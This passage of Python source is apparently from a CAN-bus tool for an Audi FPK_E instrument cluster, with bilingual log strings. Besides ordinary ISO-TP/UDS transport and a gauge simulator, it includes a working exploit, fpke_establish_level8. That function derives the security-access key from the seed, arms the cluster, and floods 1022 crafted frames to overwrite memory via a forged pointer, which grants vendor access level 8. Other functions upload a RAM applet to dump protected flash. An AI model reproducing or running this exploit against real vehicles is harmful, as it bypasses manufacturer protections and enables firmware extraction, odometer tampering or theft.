            self.sim_temp_c = max(0.0, min(130.0, float(temp_c)))
        if auto_sweep is not None:
            self.sim_auto_sweep = bool(auto_sweep)

    def start_drive_simulation(self, *, auto_sweep: bool | None = None) -> None:
        """Start background gauge signal generator (`0x31B`, `0x107`, `0x640`, `0x647`, `0x040`) with E2E CRC8H2F."""
        if auto_sweep is not None:
            self.sim_auto_sweep = bool(auto_sweep)
        if self.is_drive_simulation_running():
            return
        self.start_keepalive()
        stop = threading.Event()
        self._drive_stop = stop

        def _drive_loop() -> None:
            t0 = time.monotonic()
            tick = 0
            dist_m = 0.0
            prev_t = t0
            cnt: dict[int, int] = {cid: 0 for cid in (0x3C0, 0x31B, 0x0FD, 0x107, 0x3BE, 0x640, 0x647, 0x040, 0x65D)}
            while not stop.is_set():
                now = time.monotonic()
                dt = max(0.0, now - prev_t)
                prev_t = now
                if self.sim_auto_sweep:
                    phase = (now - t0) % 16.0
                    if phase < 6.0:
                        frac = phase / 6.0
                        spd = 120.0 * frac
                        rpm = 800.0 + 2700.0 * frac
                    elif phase < 10.0:
                        spd = 120.0
                        rpm = 3500.0
                    else:
                        frac = max(0.0, 1.0 - (phase - 10.0) / 6.0)
                        spd = 120.0 * frac
                        rpm = 800.0 + 2700.0 * frac
                    self.sim_speed_kmh = spd
                    self.sim_rpm = rpm
                else:
                    spd = self.sim_speed_kmh
                    rpm = self.sim_rpm
                dist_m += (spd / 3.6) * dt

                # 20 ms grid: 0x0FD & 0x107 every 20 ms; 0x31B & 0x040 every 40 ms; 0x3C0/0x3BE/0x640/0x647/0x65D every 100 ms
                due = [0x0FD, 0x107]
                if tick % 2 == 0:
                    due.extend([0x31B, 0x040])
                if tick % 5 == 0:
                    due.extend([0x3C0, 0x3BE, 0x640, 0x647, 0x65D])
                for cid in due:
                    if stop.is_set():
                        break
                    c = cnt[cid]
                    cnt[cid] = (c + 1) & 0x0F
                    frame = build_fpke_drive_frame(
                        cid,
                        c,
                        speed_kmh=spd,
                        rpm=rpm,
                        temp_c=self.sim_temp_c,
                        distance_m=dist_m,
                        kl15=True,
                    )
                    with contextlib.suppress(Exception):
                        self.send_frame(cid, frame, extended=False)
                tick += 1
                stop.wait(0.02)

        t = threading.Thread(target=_drive_loop, name="fpke-drive-sim", daemon=True)
        self._drive_thread = t
        t.start()

    def stop_drive_simulation(self) -> None:
        if self._drive_stop is not None:
            self._drive_stop.set()
        if self._drive_thread is not None:
            self._drive_thread.join(timeout=1.0)
        self._drive_stop = None
        self._drive_thread = None

    @contextlib.contextmanager
    def paused_keepalive(self) -> Iterator[None]:
        """Temporarily pause keepalive and drive simulation during time-critical bursts (`0x1BFCA2ED` or `0x6F1` streaming)."""
        was_ka = self.is_keepalive_running()
        was_drv = self.is_drive_simulation_running()
        if was_drv:
            self.stop_drive_simulation()
        if was_ka:
            self.stop_keepalive()
        try:
            yield
        finally:
            if was_ka:
                self.start_keepalive()
            if was_drv:
                self.start_drive_simulation()

    # ── Frame & ISO-TP I/O ──

    def drain_rx(self, max_frames: int = 128, *, quick: bool = False) -> int:
        slcan_port = getattr(self.bus, "serialPortOrig", None)
        port = slcan_port if quick else None
        parsed = getattr(self.bus, "_queue", None)
        raw_buf = getattr(self.bus, "_buffer", None)
        drained = 0
        polls = 0
        max_polls = max_frames * 4 + 128
        while drained < max_frames and polls < max_polls:
            polls += 1
            has_buf_line = isinstance(raw_buf, bytearray) and (13 in raw_buf or 7 in raw_buf)
            if (
                port is not None
                and callable(getattr(port, "in_waiting", None)) is False
                and not getattr(port, "in_waiting", 0)
                and not (parsed and parsed.qsize())
                and not has_buf_line
            ):
                break
            msg = self.bus.recv(timeout=0.0)
            if msg is None:
                still_queued = (
                    (isinstance(raw_buf, bytearray) and (13 in raw_buf or 7 in raw_buf))
                    or bool(parsed and parsed.qsize())
                    or bool(slcan_port is not None and getattr(slcan_port, "in_waiting", 0))
                )
                if still_queued:
                    continue
                break
            raw = bytes(msg.data)
            self.rx_frames += 1
            drained += 1
            if drained <= 32:
                self._record_frame("rx", msg.arbitration_id, bool(msg.is_extended_id), raw)
        return drained

    def send_frame(
        self,
        identifier: int,
        data: bytes | bytearray,
        *,
        extended: bool = False,
        pad: int | None = None,
    ) -> None:
        raw = bytes(data)
        if pad is not None and len(raw) < 8:
            raw += bytes([pad]) * (8 - len(raw))
        msg = can.Message(arbitration_id=identifier, data=raw, is_extended_id=extended)
        with self._tx_lock:
            self.bus.send(msg, timeout=FRAME_SEND_TIMEOUT)
            self.tx_frames += 1
        self._record_frame("tx", identifier, extended, raw)

    def receive_frame(
        self,
        identifier: int | None = None,
        *,
        extended: bool | None = None,
        timeout: float = 2.0,
    ) -> Any:
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            wait = min(0.05, max(0.002, deadline - time.monotonic()))
            msg = self.bus.recv(timeout=wait)
            if msg is None:
                continue
            raw = bytes(msg.data)
            is_ext = bool(msg.is_extended_id)
            self.rx_frames += 1
            self._record_frame("rx", msg.arbitration_id, is_ext, raw)
            if identifier is not None and msg.arbitration_id != identifier:
                continue
            if extended is not None and is_ext != extended:
                continue
            return msg
        target = f"0x{identifier:X}" if identifier is not None else "any ID"
        raise TimeoutError(f"No CAN frame from {target} within {timeout:.1f}s")

    def receive_flow_control(self, timeout: float = 2.0) -> tuple[int, int]:
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            msg = self.receive_frame(self.UDS_RX_ID, extended=False, timeout=max(0.05, deadline - time.monotonic()))
            if not msg.data:
                continue
            pci_type = msg.data[0] >> 4
            fc_status = msg.data[0] & 0x0F
            if pci_type == 3:
                if fc_status == 0:
                    bs = msg.data[1] if len(msg.data) > 1 else 0
                    st_min = msg.data[2] if len(msg.data) > 2 else 0
                    return bs, st_min
                if fc_status == 1:
                    continue
                raise RuntimeError(f"ISO-TP FlowControl Overflow/Abort from 0x{self.UDS_RX_ID:03X}: {bytes(msg.data).hex()}")
        raise TimeoutError(f"Timed out waiting for ISO-TP FlowControl from 0x{self.UDS_RX_ID:03X}")

    @staticmethod
    def _st_min_seconds(st_min: int) -> float:
        if 0x01 <= st_min <= 0x7F:
            return st_min / 1000.0
        if 0xF1 <= st_min <= 0xF9:
            return (st_min - 0xF0) / 10_000.0
        return 0.0

    def send_uds(self, uds_payload: bytes) -> None:
        """Send 11-bit UDS payload on `0x714` using SingleFrame or MultiFrame with `FlowControl` from `0x77E`."""
        payload = bytes(uds_payload)
        if not payload:
            raise ValueError("Empty UDS payload")
        length = len(payload)
        if length <= 7:
            self.send_frame(self.UDS_TX_ID, bytes([length]) + payload, extended=False, pad=0xAA)
            return
        self.send_frame(
            self.UDS_TX_ID,
            bytes([0x10 | ((length >> 8) & 0x0F), length & 0xFF]) + payload[:6],
            extended=False,
        )
        block_size, st_min = self.receive_flow_control()
        seq = 1
        offset = 6
        sent = 0
        delay = self._st_min_seconds(st_min)
        while offset < length:
            if delay == 0 and hasattr(self.bus, "send_batch"):
                limit = (block_size - (sent % block_size)) if block_size else ((length - offset + 6) // 7)
                batch: list[Any] = []
                while offset < length and len(batch) < limit:
                    chunk = payload[offset : offset + 7]
                    raw = bytes([0x20 | seq]) + chunk
                    if len(raw) < 8:
                        raw += b"\xaa" * (8 - len(raw))
                    msg = can.Message(arbitration_id=self.UDS_TX_ID, data=raw, is_extended_id=False)
                    self._record_frame("tx", self.UDS_TX_ID, False, raw)
                    batch.append(msg)
                    seq = (seq + 1) & 0x0F
                    offset += len(chunk)
                    sent += 1
                with self._tx_lock:
                    self.bus.send_batch(batch, timeout=BLOCK_SEND_TIMEOUT)
                    self.tx_frames += len(batch)
            else:
                chunk = payload[offset : offset + 7]
                self.send_frame(self.UDS_TX_ID, bytes([0x20 | seq]) + chunk, extended=False, pad=0xAA)
                seq = (seq + 1) & 0x0F
                offset += len(chunk)
                sent += 1
                if delay > 0:
                    time.sleep(delay)
            if block_size and sent % block_size == 0 and offset < length:
                block_size, st_min = self.receive_flow_control()
                delay = self._st_min_seconds(st_min)

    def receive_uds(self, timeout: float = 2.0) -> bytes:
        """Receive 11-bit UDS response on `0x77E` with strict sequence number and length validation."""
        deadline = time.monotonic() + timeout
        while True:
            rem = deadline - time.monotonic()
            if rem <= 0:
                raise TimeoutError(f"UDS response timeout ({timeout:.1f}s) on 0x{self.UDS_RX_ID:03X}")
            first = self.receive_frame(self.UDS_RX_ID, extended=False, timeout=rem)
            raw0 = bytes(first.data)
            if not raw0:
                continue
            kind = raw0[0] >> 4
            if kind == 0:
                sf_len = raw0[0] & 0x0F
                if sf_len == 0 or 1 + sf_len > len(raw0):
                    continue
                return raw0[1 : 1 + sf_len]
            if kind == 1:
                total = ((raw0[0] & 0x0F) << 8) | raw0[1]
                output = bytearray(raw0[2:])
                seq = 1
                self.send_frame(self.UDS_TX_ID, b"\x30\x00\x00", extended=False, pad=0xAA)
                while len(output) < total:
                    rem_cf = deadline - time.monotonic()
                    if rem_cf <= 0:
                        raise TimeoutError(
                            f"ISO-TP ConsecutiveFrame timeout on 0x{self.UDS_RX_ID:03X} ({len(output)}/{total} B)"
                        )
                    msg = self.receive_frame(self.UDS_RX_ID, extended=False, timeout=rem_cf)
                    cf = bytes(msg.data)
                    if not cf or (cf[0] >> 4) != 2:
                        raise RuntimeError(f"Expected ISO-TP ConsecutiveFrame on 0x{self.UDS_RX_ID:03X}, got: {cf.hex()}")
                    if (cf[0] & 0x0F) != (seq & 0x0F):
                        raise RuntimeError(
                            f"ISO-TP sequence error on 0x{self.UDS_RX_ID:03X}: expected {seq & 0x0F:X}, got {cf.hex()}"
                        )
                    output.extend(cf[1:])
                    seq += 1
                return bytes(output[:total])

    def request_uds(
        self,
        uds_payload: bytes,
        expected_sid: int | None = None,
        *,
        timeout: float = 2.0,
        allow_pending: bool = True,
    ) -> bytes:
        """Send UDS request on `0x714` and return validated response from `0x77E`, waiting through NRC `0x78`."""
        req = bytes(uds_payload)
        if not req:
            raise ValueError("Empty UDS payload")
        req_sid = req[0]
        if expected_sid is None:
            expected_sid = (req_sid + 0x40) & 0xFF
        self.drain_rx(quick=True)
        self.send_uds(req)
        deadline = time.monotonic() + timeout
        wait = max(timeout, 2.5)
        while True:
            rem = deadline - time.monotonic()
            if rem <= 0:
                raise TimeoutError(f"UDS response timeout ({timeout:.1f}s) for {req[:8].hex()}")
            resp = self.receive_uds(timeout=min(wait, rem))
            if (
                allow_pending
                and len(resp) >= 3
                and resp[0] == 0x7F
                and resp[1] == req_sid
                and resp[2] == 0x78
            ):
                deadline = max(deadline, time.monotonic() + P2_STAR_WAIT)
                wait = P2_STAR_WAIT
                continue
            return _checked_response(req_sid, resp, expected_sid)


# ────────────────────────────── Active Session Registry ──────────────────────────────

_ACTIVE_LINK_LOCK = threading.Lock()
_ACTIVE_LINK: FpkeCanLink | None = None


def get_active_fpke_link(port: str | None = None, interface: str | None = None) -> FpkeCanLink | None:
    """Return the currently open `FpkeCanLink` if it is alive (and matches `port`/`interface` when specified)."""
    with _ACTIVE_LINK_LOCK:
        link = _ACTIVE_LINK
        if link is None or link.is_closed:
            return None
        if port is not None and link.port != port:
            return None
        if interface is not None and link.interface != interface:
            return None
        return link


def set_active_fpke_link(link: FpkeCanLink | None) -> None:
    """Register `link` as the active persistent FPK_E CAN session link, closing any previous link."""
    global _ACTIVE_LINK
    with _ACTIVE_LINK_LOCK:
        old = _ACTIVE_LINK
        _ACTIVE_LINK = link
    if old is not None and old is not link and not old.is_closed:
        old.close()


def close_active_fpke_link() -> None:
    """Close and clear the active persistent FPK_E CAN session link."""
    set_active_fpke_link(None)


def open_or_reuse_fpke_link(
    port: str,
    *,
    interface: str = "slcan",
    log_path: Path | None = None,
    bus: Any | None = None,
) -> FpkeCanLink:
    """Reuse the open `FpkeCanLink` for `(port, interface)` if available, or open a new persistent link."""
    global _ACTIVE_LINK
    with _ACTIVE_LINK_LOCK:
        cur = _ACTIVE_LINK
        if (
            cur is not None
            and not cur.is_closed
            and cur.port == port
            and cur.interface == interface
            and (bus is None or cur.bus is bus)
        ):
            if log_path is not None:
                cur.attach_log(log_path)
            return cur
        _ACTIVE_LINK = None
    if cur is not None and not cur.is_closed:
        cur.close()
    new_link = FpkeCanLink(port, interface=interface, log_path=log_path, bus=bus)
    with _ACTIVE_LINK_LOCK:
        _ACTIVE_LINK = new_link
    return new_link


@contextlib.contextmanager
def _managed_fpke_link(
    port: str,
    *,
    interface: str = "slcan",
    log_path: Path | None = None,
    bus: Any | None = None,
    keep_open: bool = False,
) -> Iterator[FpkeCanLink]:
    """Yield an `FpkeCanLink`, keeping it open on exit when `keep_open=True` or when reusing an active session."""
    reused = get_active_fpke_link(port, interface) is not None and (
        bus is None or getattr(get_active_fpke_link(port, interface), "bus", None) is bus
    )
    if keep_open or reused:
        link = open_or_reuse_fpke_link(port, interface=interface, log_path=log_path, bus=bus)
        try:
            yield link
        finally:
            if not keep_open and not reused:
                close_active_fpke_link()
    else:
        with FpkeCanLink(port, interface=interface, log_path=log_path, bus=bus) as link:
            yield link


# ────────────────────────────── Protocol Primitives (Level 8, FD11, 0x23, 0x3D) ──────────────────────────────


def fpke_read_memory_0x23(link: FpkeCanLink, address: int, size: int, *, timeout: float = 4.0) -> bytes:
    """Read `size` bytes at `address` via UDS `23 44 <addr:4BE> <size:4BE>`, verifying SID `0x63` and exact length."""
    req = b"\x23\x44" + address.to_bytes(4, "big") + size.to_bytes(4, "big")
    resp = link.request_uds(req, 0x63, timeout=timeout)
    data = resp[1:]
    if len(data) != size:
        raise RuntimeError(f"Short UDS 0x23 memory read at 0x{address:08X}: got {len(data)} != {size} bytes")
    return data


def fpke_write_memory_0x3d(link: FpkeCanLink, address: int, data: bytes, *, timeout: float = 6.0) -> None:
    """Write `data` to RAM `address` via UDS `3D 44 <addr:4BE> <len:4BE> <data>`."""
    req = b"\x3d\x44" + address.to_bytes(4, "big") + len(data).to_bytes(4, "big") + bytes(data)
    link.request_uds(req, 0x7D, timeout=timeout)


def fpke_idauth(link: FpkeCanLink, idcode_16b: bytes) -> bytes:
    """Write 16-byte candidate `idcode_16b` to `IDAUTH` (`0xFFA08000`), perform mandatory `SELFID3` dummy read, and return `IDST`."""
    if len(idcode_16b) != 16:
        raise ValueError(f"RH850 IDCODE must be 16 bytes, got {len(idcode_16b)}")
    fpke_write_memory_0x3d(link, IDAUTH_ADDR, idcode_16b)
    fpke_read_memory_0x23(link, IDAUTH_ADDR + 0x0C, 4)  # mandatory dummy read of SELFID3 (0xFFA0800C)
    return fpke_read_memory_0x23(link, IDST_ADDR, 4)


def fpke_verify_level8_control(link: FpkeCanLink) -> bytes:
    """Enter `10 03 -> 10 60` and verify `CFlash[0:16]` starts with `80 07 F0 10`."""
    link.request_uds(b"\x10\x03", 0x50, timeout=2.0)
    link.request_uds(b"\x10\x60", 0x50, timeout=2.0)
    cflash_16 = fpke_read_memory_0x23(link, FPKE_CFLASH_ADDR, 16)
    if cflash_16[:4] != FPKE_CFLASH_CONTROL_PREFIX:
        link.level8_active = False
        raise RuntimeError(
            tr(
                f"Уровень доступа поставщика 8 не установлен: контрольное чтение CFlash вернуло {cflash_16.hex()} "
                "(ожидался префикс 80 07 F0 10).",
                f"Vendor level 8 was not established: CFlash control read returned {cflash_16.hex()} "
                "(expected prefix 80 07 F0 10).",
            )
        )
    link.level8_active = True
    return cflash_16


def fpke_check_level8(link: FpkeCanLink, *, timeout: float = 0.8) -> bytes | None:
    """Probe whether vendor level 8 is already active in the current session (`10 03 -> 10 60 -> 23 44 00000000 00000010`)."""
    try:
        link.request_uds(b"\x10\x03", 0x50, timeout=timeout)
        link.request_uds(b"\x10\x60", 0x50, timeout=timeout)
        cflash_16 = fpke_read_memory_0x23(link, FPKE_CFLASH_ADDR, 16, timeout=timeout)
        if cflash_16[:4] == FPKE_CFLASH_CONTROL_PREFIX:
            link.level8_active = True
            return cflash_16
    except Exception:
        pass
    link.level8_active = False
    return None


def fpke_ensure_level8(
    link: FpkeCanLink,
    *,
    frame_delay: float = FPKE_DEFAULT_FRAME_DELAY,
    wake_seconds: float = 4.0,
    post_exploit_sleep: float = 1.0,
    reporter: OperationReporter = NULL_REPORTER,
) -> dict[str, Any]:
    """Check if vendor level 8 is already active on `link`; if not, establish vendor level 8 over CAN."""
    verify_fpke_self_tests()
    link.start_keepalive()
    cflash_16 = fpke_check_level8(link)
    if cflash_16 is not None:
        reporter.can_log(
            tr(
                f"Уровень доступа 8 уже активен в открытой сессии (CFlash[0:16] = {cflash_16[:4].hex(' ').upper()} …)",
                f"Vendor level 8 is already active in the open session (CFlash[0:16] = {cflash_16[:4].hex(' ').upper()} …)",
            )
        )
        reporter.info(tr("Уровень доступа 8 подтверждён в открытой сессии", "Vendor level 8 confirmed in open session"))
        return {
            "vendor_level": FPKE_REQUIRED_LEVEL,
            "reused_session": True,
            "stream_elapsed_s": 0.0,
            "cflash_first_16": cflash_16.hex(),
        }
    return fpke_establish_level8(
        link,
        frame_delay=frame_delay,
        wake_seconds=wake_seconds,
        post_exploit_sleep=post_exploit_sleep,
        reporter=reporter,
    )


def fpke_establish_level8(
    link: FpkeCanLink,
    *,
    frame_delay: float = FPKE_DEFAULT_FRAME_DELAY,
    wake_seconds: float = 4.0,
    post_exploit_sleep: float = 1.0,
    reporter: OperationReporter = NULL_REPORTER,
) -> dict[str, Any]:
    """Execute the complete keyless CAN sequence to establish vendor level 8 on Audi FPK_E SW 83A.

    1. Starts keepalive (`0x3C0`, `0x663`, `0x585`, `0x3BE`) and wakes the cluster for `wake_seconds` (4 s).
    2. `10 03` -> `27 03` -> `27 04 <(BE32(seed) + 0xB80B) mod 2^32>` -> `2E F198 01..06` -> `2E 0514 01` -> `3E 00`.
    3. Sends 3 EC arming frames on `0x1BFCA2EC` (100 ms apart) and waits for `0x1BFCA2EE = 14 02`.
    4. Stops keepalive and transmits 1022 paced frames (`0.35 ms`/frame):
       `ED[0..1018]` + `17FA0E14 FF` + `ED[1019]` (`0xFEDF310D`) + `17FA0E14 CF` (`[0xFEDF3113] = 8`).
    5. Waits `post_exploit_sleep` (1 s), restarts keepalive, enters `10 03 -> 10 60`, and verifies `CFlash[0:16]`.
    """
    verify_fpke_self_tests()
    link.start_keepalive()
    if wake_seconds > 0:
        reporter.can_log(
            tr(
                f"Имитация сети CAN (3C0/663/585/3BE) и пробуждение приборки ({wake_seconds:.1f} с)…",
                f"Starting CAN network keepalive (3C0/663/585/3BE) and waking cluster ({wake_seconds:.1f} s)…",
            )
        )
        end_wake = time.monotonic() + wake_seconds
        while time.monotonic() < end_wake:
            reporter.check_cancelled()
            time.sleep(min(0.1, max(0.01, end_wake - time.monotonic())))

    reporter.can_log(tr("UDS 10 03 + SecurityAccess 27 03/04 (+0xB80B) + DID 0514 arming", "UDS 10 03 + SecurityAccess 27 03/04 (+0xB80B) + DID 0514 arming"))
    link.request_uds(b"\x10\x03", 0x50, timeout=2.0)
    seed_resp = link.request_uds(b"\x27\x03", 0x67, timeout=2.0)
    if len(seed_resp) != 6:
        raise RuntimeError(f"Unexpected SecurityAccess 27 03 response: {seed_resp.hex()}")
    seed_int = int.from_bytes(seed_resp[2:6], "big")
    key_bytes = ((seed_int + 0xB80B) & 0xFFFFFFFF).to_bytes(4, "big")
    link.request_uds(b"\x27\x04" + key_bytes, 0x67, timeout=2.0)
    link.request_uds(bytes.fromhex("2ef198010203040506"), 0x6E, timeout=2.0)
    link.request_uds(bytes.fromhex("2e051401"), 0x6E, timeout=4.0, allow_pending=True)
    link.request_uds(b"\x3e\x00", 0x7E, timeout=2.0)

    link.drain_rx(quick=True)
    for idx, payload in enumerate(FPKE_ARM_FRAMES):
        link.send_frame(FPKE_ARM_ID, payload, extended=True)
        if idx + 1 < len(FPKE_ARM_FRAMES):
            time.sleep(0.1)

    arm_deadline = time.monotonic() + 2.0
    armed = False
    while time.monotonic() < arm_deadline:
        rem = arm_deadline - time.monotonic()
        try:
            msg = link.receive_frame(FPKE_ARM_RESPONSE_ID, extended=True, timeout=rem)
        except TimeoutError:
            break
        raw = bytes(msg.data)
        if raw[:2] == b"\x14\x02":
            armed = True
            break
        if raw[:2] == b"\x14\xef":
            raise RuntimeError(
                tr(
                    f"Приборка отклонила EC arming на 0x1BFCA2EE ({raw.hex(' ').upper()}).",
                    f"Cluster rejected EC arming on 0x1BFCA2EE ({raw.hex(' ').upper()}).",
                )
            )
    if not armed:
        raise RuntimeError(
            tr(
                "Не получен ответ готовности EC arming (0x1BFCA2EE = 14 02). Проверьте питание приборки и шину CAN.",
                "EC arming readiness (0x1BFCA2EE = 14 02) was not received. Check cluster power and CAN bus.",
            )
        )
    reporter.can_log(tr("EC arming подтверждён (0x1BFCA2EE = 14 02) — отправка 1022 кадров потока…", "EC arming confirmed (0x1BFCA2EE = 14 02) — sending 1022-frame stream…"))

    link.stop_keepalive()
    t_start = time.monotonic()
    next_frame = time.perf_counter()

    def _paced_send(arb_id: int, frame_bytes: bytes) -> None:
        nonlocal next_frame
        link.send_frame(arb_id, frame_bytes, extended=True)
        if frame_delay > 0:
            next_frame += frame_delay
            delay = next_frame - time.perf_counter()
            if delay > 0:
                time.sleep(delay)

    for index in range(FPKE_POINTER_FRAME):
        _paced_send(FPKE_BLOCK_ID, flood_payload(index))
    _paced_send(FPKE_CF_CH9_ID, bytes.fromhex("1022800300000000"))
    _paced_send(FPKE_BLOCK_ID, flood_payload(FPKE_POINTER_FRAME))
    _paced_send(FPKE_CF_CH9_ID, bytes([0x21, FPKE_REQUIRED_LEVEL, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA]))
    stream_elapsed = round(time.monotonic() - t_start, 3)

    if post_exploit_sleep > 0:
        time.sleep(post_exploit_sleep)
    link.start_keepalive()

    cflash_control = fpke_verify_level8_control(link)
    reporter.can_log(
        tr(
            f"Vendor level 8 установлен за {stream_elapsed:.3f} с (CFlash[0:16] = {cflash_control[:4].hex(' ').upper()} …)",
            f"Vendor level 8 established in {stream_elapsed:.3f} s (CFlash[0:16] = {cflash_control[:4].hex(' ').upper()} …)",
        )
    )
    reporter.info(tr("Сессия чтения по CAN открыта", "CAN read session established"))
    return {
        "block_buffer": f"0x{FPKE_BLOCK_BUFFER:08X}",
        "cantp_channel": 9,
        "cantp_pointer": f"0x{FPKE_CANTP_CH9_PTR:08X}",
        "pointer_frame": FPKE_POINTER_FRAME,
        "forged_pointer": f"0x{FPKE_FORGED_PTR:08X}",
        "level_address": f"0x{FPKE_LEVEL_ADDRESS:08X}",
        "vendor_level": FPKE_REQUIRED_LEVEL,
        "template_sha256": FPKE_TEMPLATE_SHA256,
        "stream_elapsed_s": stream_elapsed,
        "cflash_first_16": cflash_control.hex(),
    }


def fpke_authenticate_fd11(
    link: FpkeCanLink,
    key_16b: bytes,
    *,
    expected_id_hex: str | None = None,
    reporter: OperationReporter = NULL_REPORTER,
) -> str:
    """Authenticate vendor level 6 via standard `2E FD11 03 / 04 / 06` using a known 16-byte AES-128 key."""
    if len(key_16b) != 16:
        raise ValueError("FD11 key must contain exactly 16 bytes")
    t16 = bytes(range(16))
    t8 = bytes(range(0x10, 0x18))
    link.request_uds(b"\x10\x60", 0x50, timeout=4.0)
    challenge = link.request_uds(b"\x2e\xfd\x11\x03" + t16 + t8 + b"\x06", 0x6E, timeout=4.0)
    if len(challenge) != 26 or challenge[:3] != b"\x6e\xfd\x11":
        raise RuntimeError(f"Unexpected FD11 challenge response: {challenge.hex()}")
    identifier = challenge[11:26].hex()
    if expected_id_hex is not None and identifier.lower() != expected_id_hex.lower():
        raise RuntimeError(f"FD11 challenge identifier mismatch: {identifier} != {expected_id_hex}")
    proof = build_fd11_proof(challenge, key_16b, t16=t16, t8=t8)
    resp04 = link.request_uds(b"\x2e\xfd\x11\x04" + proof, 0x6E, timeout=4.0)
    if resp04 != b"\x6e\xfd\x11":
        raise RuntimeError(f"FD11 04 rejected: {resp04.hex()}")
    resp06 = link.request_uds(b"\x2e\xfd\x11\x06", 0x6E, timeout=4.0)
    if len(resp06) == 39 and resp06[:3] == b"\x6e\xfd\x11":
        crc_calc = struct.pack("<I", zlib.crc32(resp06[3:-4]) & 0xFFFFFFFF)
        if crc_calc != resp06[-4:]:
            raise RuntimeError("FD11 06 response CRC-32 mismatch")
    elif resp06 != b"\x6e\xfd\x11":
        raise RuntimeError(f"FD11 06 rejected: {resp06.hex()}")
    reporter.success(tr("Штатная авторизация FD11 (vendor level 6) подтверждена", "Standard FD11 authentication (vendor level 6) confirmed"))
    return identifier


# ────────────────────────────── Memory Readers (Fast Stream + UDS 0x23 / Applet Fallback) ──────────────────────────────


@contextlib.contextmanager
def _applet_ram_guard(
    link: FpkeCanLink,
    payload: bytes,
    *,
    param_size: int = 4,
    save_result: bool = True,
    check_bfaselr: bool = False,
) -> Iterator[dict[str, Any]]:
    """Save SX RAM (`0xFEDF1800`, `0xFEDF1900`, `0xFEDF1A00`), upload `payload`, and guarantee RAM restoration."""
    orig_entry = fpke_read_memory_0x23(link, FPKE_APPLET_ENTRY, len(payload))
    orig_param = fpke_read_memory_0x23(link, FPKE_SOURCE_PARAM, param_size)
    orig_result = (
        fpke_read_memory_0x23(link, FPKE_RESULT_ADDR, FPKE_RESULT_SIZE)
        if save_result
        else fpke_read_memory_0x23(link, FPKE_MARKER_ADDR, 32)
    )
    saved_return = fpke_read_memory_0x23(link, FPKE_SAVED_RETURN, 4)
    if saved_return != FPKE_CALLER_RETURN.to_bytes(4, "little"):
        raise RuntimeError(
            f"Unexpected saved return at 0x{FPKE_SAVED_RETURN:08X}: {saved_return.hex()} "
            f"(expected {FPKE_CALLER_RETURN.to_bytes(4, 'little').hex()})"
        )
    if check_bfaselr:
        init_bfaselr = fpke_read_memory_0x23(link, BFASELR_ADDR, 1)
        if init_bfaselr != b"\x00":
            raise RuntimeError(f"Unexpected initial BFASELR: {init_bfaselr.hex()}")

    fpke_write_memory_0x3d(link, FPKE_APPLET_ENTRY, payload)
    state: dict[str, Any] = {"ram_restored": False}
    try:
        yield state
    finally:
        with contextlib.suppress(Exception):
            fpke_write_memory_0x3d(link, FPKE_APPLET_ENTRY, orig_entry)
            fpke_write_memory_0x3d(link, FPKE_SOURCE_PARAM, orig_param)
            if save_result:
                fpke_write_memory_0x3d(link, FPKE_RESULT_ADDR, orig_result)
            else:
                fpke_write_memory_0x3d(link, FPKE_MARKER_ADDR, orig_result)
            restored = (
                fpke_read_memory_0x23(link, FPKE_APPLET_ENTRY, len(payload)) == orig_entry
                and fpke_read_memory_0x23(link, FPKE_SOURCE_PARAM, param_size) == orig_param
                and (
                    fpke_read_memory_0x23(link, FPKE_RESULT_ADDR, FPKE_RESULT_SIZE) == orig_result
                    if save_result
                    else fpke_read_memory_0x23(link, FPKE_MARKER_ADDR, 32) == orig_result
                )
                and (not check_bfaselr or fpke_read_memory_0x23(link, BFASELR_ADDR, 1) == b"\x00")
            )
            state["ram_restored"] = restored


def _stream_chunk_via_rscan(
    link: FpkeCanLink,
    address: int,
    size: int,
    *,
    frame_timeout: float = 1.2,
) -> bytes:
    """Trigger the uploaded `0xFEDF1800` RSCAN0 `TM17` streaming applet for `size` bytes (multiple of 8) and collect `0x6F1` frames."""
    if size <= 0 or size % 8 != 0:
        raise ValueError(f"Stream chunk size must be a positive multiple of 8, got {size}")
    frames_needed = size // 8
    fpke_write_memory_0x3d(link, FPKE_SOURCE_PARAM, struct.pack("<II", address & 0xFFFFFFFF, frames_needed))
    trigger_req = (
        b"\x3d\x44"
        + FPKE_SAVED_RETURN.to_bytes(4, "big")
        + (4).to_bytes(4, "big")
        + FPKE_APPLET_ENTRY.to_bytes(4, "little")
    )
    collected = bytearray()
    rx_count = 0
    with link.paused_keepalive():
        link.drain_rx(quick=True)
        link.send_uds(trigger_req)
        deadline = time.monotonic() + max(4.0, frames_needed * 0.005 + frame_timeout)
        got_7d = False
        with link.suspend_rx_trace():
            while (len(collected) < size or not got_7d) and time.monotonic() < deadline:
                msg = link.receive_frame(timeout=frame_timeout)
                if msg.is_extended_id:
                    continue
                raw = bytes(msg.data)
                if msg.arbitration_id == link.STREAM_RX_ID and len(collected) < size:
                    if len(raw) != 8:
                        raise TimeoutError(
                            f"Short 0x{link.STREAM_RX_ID:03X} frame at 0x{address:08X}: {len(raw)} bytes"
                        )
                    collected.extend(raw)
                    rx_count += 1
                elif msg.arbitration_id == link.UDS_RX_ID and raw:
                    pci_type = raw[0] >> 4
                    if pci_type == 0:
                        sf_len = raw[0] & 0x0F
                        uds_reply = raw[1 : 1 + sf_len]
                        if uds_reply[:1] == b"\x7d":
                            got_7d = True
                            if len(collected) >= size:
                                break
                        elif len(uds_reply) >= 3 and uds_reply[0] == 0x7F and uds_reply[2] == 0x78:
                            continue
                        elif uds_reply[:1] == b"\x7f":
                            raise RuntimeError(f"Trigger 0x3D rejected: {uds_reply.hex()}")
                    elif pci_type == 1:
                        # 10-byte positive response `7D 44 <addr:4> <len:4>` arrives as FirstFrame + ConsecutiveFrame
                        link.send_frame(link.UDS_TX_ID, b"\x30\x00\x00", pad=0x55)
                        if raw[2:3] == b"\x7f":
                            raise RuntimeError(f"Trigger 0x3D rejected: {raw.hex()}")
                    elif pci_type == 2:
                        got_7d = True
                        if len(collected) >= size:
                            break
        link.write_stream_summary(address, size, len(collected), rx_count)
    if len(collected) != size:
        raise TimeoutError(
            f"RSCAN0 stream from 0x{link.STREAM_RX_ID:03X} @ 0x{address:08X} incomplete: {len(collected)}/{size} B"
        )
    return bytes(collected)


def fpke_read_region_in_session(
    link: FpkeCanLink,
    *,
    mode: str,
    source: int,
    length: int,
    chunk_size: int = 500,
    use_stream: bool = True,
    label: str = "",
    reporter: OperationReporter = NULL_REPORTER,
) -> tuple[bytes, dict[str, Any]]:
